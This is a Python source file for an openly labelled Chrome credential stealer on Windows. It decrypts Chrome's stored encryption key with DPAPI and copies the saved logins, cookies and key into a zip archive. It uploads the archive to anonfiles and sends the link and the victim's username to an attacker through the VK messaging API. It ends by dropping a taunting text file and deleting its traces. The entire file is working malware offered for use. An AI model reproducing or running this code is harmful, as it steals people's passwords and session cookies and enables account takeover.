import os, requests, random, shutil, win32crypt, json, base64

userName = os.getcwd().split('\\')[2]
pathLS = f'C:\\Users\\{userName}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
pathLG = f'C:\\Users\\{userName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
pathCOOK = f'C:\\Users\\{userName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
pathKEY = pathCOOK[:len(pathCOOK)-7]+'encrypted_key'

if os.path.exists(pathCOOK):
	os.chdir(pathCOOK[:len(pathCOOK)-7])

	cwd = os.getcwd()
	os.makedirs('HASHED', exist_ok=True)

	def acquire_encryption_key():
		b64dpapi = None
		with open(pathLS) as jf:
			data = json.load(jf)
			b64dpapi = data["os_crypt"]["encrypted_key"]
		pre_key = base64.b64decode(b64dpapi)
		aead_encryption_key = win32crypt.CryptUnprotectData(pre_key[5:], None, None, None, 0)[1]
		return aead_encryption_key

	key = open(pathKEY, 'wb')
	key.write(acquire_encryption_key())
	key.close()
	shutil.copyfile(pathKEY, 'HASHED\\encryptKey')
	shutil.copyfile(pathLS, 'HASHED\\localState')
	shutil.copyfile(pathLG, 'HASHED\\loginData')
	shutil.copyfile(pathCOOK, 'HASHED\\cookie')
	arch = shutil.make_archive('HASHED', 'zip', 'HASHED')

	link = requests.post('https://api.anonfiles.com/upload', files = {'file': open(arch, 'rb')}).json()['data']['file']['url']['full']

	token = 'vktoken with messages scope'
	userID = 'user who will receive the message'

	text = 'zip: ' + link + '\n user: ' + userName
	requests.post(f'https://api.vk.com/method/messages.send?user_ids=&access_token={token}&v=5.130',
				params={'user_id': userID,
						'message': text,
						'random_id': random.randint(1, 8888888)})


	goodbye = open(pathCOOK[:len(pathCOOK)-7]+'THX 4 USING MY STEALLER.txt', 'w')
	for x in range(0, 10000):
		goodbye.write('if u find this pls write to me: g.man.syn.c@gmail.com\n')
	goodbye.close()
	os.remove(pathKEY)
	os.remove(arch)
